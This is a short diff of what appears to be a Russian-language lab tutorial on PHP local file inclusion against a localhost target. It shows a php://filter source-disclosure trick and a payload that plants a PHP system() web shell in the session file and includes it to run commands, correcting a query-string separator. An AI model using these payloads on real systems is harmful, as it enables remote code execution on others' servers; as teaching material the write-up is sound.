@@ -111,7 +111,7 @@ php://filter/convert.base64-encode/resource=./index.php
   Полезная нагрузка в данном случае будет следующая:
 ```
 http://localhost:8090/index.php?lang=<?php system($_GET['cmd']);?>
-http://localhost:8090/index.php?lang=/tmp/sess_<имя-cookie>?cmd=url-encode(команда)
+http://localhost:8090/index.php?lang=/tmp/sess_<имя-cookie>&cmd=url-encode(команда)
 ```
 ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.015.jpeg)
 
